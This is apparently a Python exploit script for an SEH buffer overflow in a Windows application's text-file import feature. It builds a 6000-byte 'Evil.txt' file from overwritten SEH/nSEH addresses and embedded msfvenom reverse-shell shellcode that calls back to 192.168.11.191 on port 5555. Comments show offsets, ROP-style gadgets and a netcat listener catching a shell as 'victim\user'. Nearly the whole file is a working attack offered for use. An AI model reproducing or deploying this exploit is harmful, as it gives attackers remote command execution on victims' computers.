#!/usr/bin/python

#compile it , go to "Computer Tab > From Text File > open the Evil.txt and bomb "

#root@kali:~# nc -nvlp 5555
#listening on [any] 5555 ...
#connect to [192.168.11.191] from (UNKNOWN) [192.168.11.190] 49363
#Microsoft Windows [Version 6.1.7601]
#Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
#
#C:\Users\User\Desktop>whoami
#whoami
#victim\user
#
#C:\Users\User\Desktop>

#61E012F6   5F               POP EDI
#61E012F7   5D               POP EBP
#61E012F8   C3               RETN

#root@kali:~# /usr/bin/msf-pattern_offset -q 30684139
#[*] Exact match at offset 209

#root@kali:~# /usr/bin/msf-pattern_offset -q 68413268
#[*] Exact match at offset 217


#61E053A9   54               PUSH ESP

#61E014F6   5B               POP EBX
#61E014F7   5D               POP EBP
#61E014F8   C3               RETN


nseh ="\xA9\x53\xE0\x61"
seh = "\xF6\x14\xE0\x61"

#root@kali:~# msfvenom -p windows/shell_reverse_tcp lhost=192.168.11.191 lport=5555 -e x86/alpha_mixed BufferRegister=ESP
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#Found 1 compatible encoders
#Attempting to encode payload with 1 iterations of x86/alpha_mixed
#x86/alpha_mixed succeeded with size 702 (iteration=0)
#x86/alpha_mixed chosen with final size 702
#Payload size: 702 bytes
#TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIylm8LBc0S0EPSPK9kUP1IPsTnkv0FPLKV2TLLKsbB4Nk1bux4OLw1Zuvp1KOll7LQqQlfbDl10yQzoFmwqJgHbIbaBbwNkF2R0lKQZ5lLK0LTQCHYs0H7qJq2qNk1IEpVaxSLKpIVxKSdzSyNkWDnkvaKf01yolliQjoFmGqo7uhIpaeJVdCQml8uksMq4PuYt1HLK1H14wqXSQvLKtLBknkV8glgqICNkfdnk5Q8PmYqTVDvDQKaKcQaIpZPQIo9pSoco1JnkB2JKlM3mph5ceb5Pc0e82W3CfR3oRtE82lD7FFEWioZuh8J0FawpePeyo4aDF058q9k0pkuPKOZuf0pPv0rpaPRpg060e8zJTOYO9pKOXUnwBJgu0hkpLhtKOOE86bEP5EOCk99vrJVpPV2wrHOiNEadsQYojuNe9PsD6liornvhRUzLe8jP85ORF6yoXUcXU3pm1t7pLIJC67aGv7ea9f3ZDRryPVYrKMSV8GBdFDElFac1LMQTTdvpxFS02dcdf0CfqFpVCv662nBv1FQCbv3XBYzlWOOvKOzuLIIpbnpVw6KO6P58VhNg5M1pYoXUoKjPMey2PVphoVmEOMmMIohU5l36QlfjMPIkipt5wumksw23sBROpjuPF3YoZuAA

payload = "TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIylm8LBc0S0EPSPK9kUP1IPsTnkv0FPLKV2TLLKsbB4Nk1bux4OLw1Zuvp1KOll7LQqQlfbDl10yQzoFmwqJgHbIbaBbwNkF2R0lKQZ5lLK0LTQCHYs0H7qJq2qNk1IEpVaxSLKpIVxKSdzSyNkWDnkvaKf01yolliQjoFmGqo7uhIpaeJVdCQml8uksMq4PuYt1HLK1H14wqXSQvLKtLBknkV8glgqICNkfdnk5Q8PmYqTVDvDQKaKcQaIpZPQIo9pSoco1JnkB2JKlM3mph5ceb5Pc0e82W3CfR3oRtE82lD7FFEWioZuh8J0FawpePeyo4aDF058q9k0pkuPKOZuf0pPv0rpaPRpg060e8zJTOYO9pKOXUnwBJgu0hkpLhtKOOE86bEP5EOCk99vrJVpPV2wrHOiNEadsQYojuNe9PsD6liornvhRUzLe8jP85ORF6yoXUcXU3pm1t7pLIJC67aGv7ea9f3ZDRryPVYrKMSV8GBdFDElFac1LMQTTdvpxFS02dcdf0CfqFpVCv662nBv1FQCbv3XBYzlWOOvKOzuLIIpbnpVw6KO6P58VhNg5M1pYoXUoKjPMey2PVphoVmEOMmMIohU5l36QlfjMPIkipt5wumksw23sBROpjuPF3YoZuAA"
#nseh ="\xEB\x06\xEB\x04"
buffer = "A" * 209 + seh + "A" * 8 + nseh + payload +"D" *(6000-217-4-len(payload))
#buffer ="A" * 213 + nseh + "bbbbb" + "D" * (6000-len(nseh)-213-len(seh))


try:
	f=open("Evil.txt","w")
	print "[+] Creating %s bytes evil payload.." %len(buffer)
	f.write(buffer)
	f.close()
	print "[+] File created!"
except Exception as e:
	print e
